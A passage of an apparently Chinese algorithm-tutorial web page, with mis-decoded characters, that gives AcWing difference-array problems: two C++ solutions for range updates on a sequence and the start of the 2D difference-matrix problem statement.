¼å¼</strong></p><p>å…±ä¸€è¡Œï¼ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€ç»ˆåºåˆ—ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le n,m \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>l</mi><mo>â‰¤</mo><mi>r</mi><mo>â‰¤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \le l \le r \le n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1000</mn><mo>â‰¤</mo><mi>c</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le c \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1000</mn><mo>â‰¤</mo><mtext>æ•´æ•°åºåˆ—ä¸­å…ƒç´ çš„å€¼</mtext><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">-1000 \le æ•´æ•°åºåˆ—ä¸­å…ƒç´ çš„å€¼ \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1000</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">æ•´æ•°åºåˆ—ä¸­å…ƒç´ çš„å€¼</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>6 31 2 2 1 2 11 3 13 5 11 6 1</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>3 4 5 3 4 2</code></pre><h3 id="æ³•1-b-i-a-i-a-i-1">æ³•1 b[i] = a[i] - a[i - 1]</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], b[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    b[i] = a[i] - a[i - <span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> l, r, c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;c);</span><br><span class="line">    b[l] += c;</span><br><span class="line">    b[r + <span class="number">1</span>] -= c;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    b[i] += b[i - <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ³•2-é€šè¿‡insert-åˆå§‹åŒ–b-i">æ³•2 é€šè¿‡insert()åˆå§‹åŒ–b[i]</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN], b[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">  b[l] += c;</span><br><span class="line">  b[r + <span class="number">1</span>] -= c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, m;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="built_in">insert</span>(i, i, a[i]);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    <span class="type">int</span> l, r, c;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;c);</span><br><span class="line">    <span class="built_in">insert</span>(l, r, c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    b[i] += b[i - <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-798-å·®åˆ†çŸ©é˜µ"><a href="https://www.acwing.com/problem/content/800/">AcWing 798. å·®åˆ†çŸ©é˜µ</a></h2><p>è¾“å…¥ä¸€ä¸ª <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> åˆ—çš„æ•´æ•°çŸ©é˜µï¼Œå†è¾“å…¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> ä¸ªæ“ä½œï¼Œæ¯ä¸ªæ“ä½œåŒ…å«äº”ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">x_1, y_1, x_2, y_2, c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span></span></span></span>ï¼Œå…¶ä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_1, y_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_2, y_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> è¡¨ç¤ºä¸€ä¸ªå­çŸ©é˜µçš„å·¦ä¸Šè§’åæ ‡å’Œå³ä¸‹è§’åæ ‡ã€‚</p><p>æ¯ä¸ªæ“ä½œéƒ½è¦å°†é€‰ä¸­çš„å­çŸ©é˜µä¸­çš„æ¯ä¸ªå…ƒç´ çš„å€¼åŠ ä¸Š <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span>ã€‚</p><p>è¯·ä½ å°†è¿›è¡Œå®Œæ‰€æœ‰æ“ä½œåçš„çŸ©é˜µè¾“å‡ºã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo separator="true">,</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">n,m,q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>ã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ•´æ•°çŸ©é˜µã€‚</p><p>æ¥ä¸‹æ¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> è¡Œï¼Œæ¯è¡ŒåŒ…å« <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span> ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">x_1, y_1, x_2, y_2, c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span></span></span></span>ï¼Œè¡¨ç¤ºä¸€ä¸ªæ“ä½œã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>å…± <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> è¡Œï¼Œæ¯è¡Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ‰€æœ‰æ“ä½œè¿›è¡Œå®Œæ¯•åçš„æœ€ç»ˆçŸ©é˜µã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo separator="true">,</mo><mi>m</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n,m \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>q</mi><mo>â‰¤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le q \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><msub><mi>x</mi><mn>1</mn></msub><mo>â‰¤</mo><msub><mi>x</mi><mn>2</mn></msub><mo>â‰¤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1 \le x_1 \le x_2 \le n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><msub><mi>y</mi><mn>1</mn></msub><mo>â‰¤</mo><msub><mi>y</mi><mn>2</mn></msub><mo>â‰¤</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">1 \le y_1 \le y_2 \le m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span 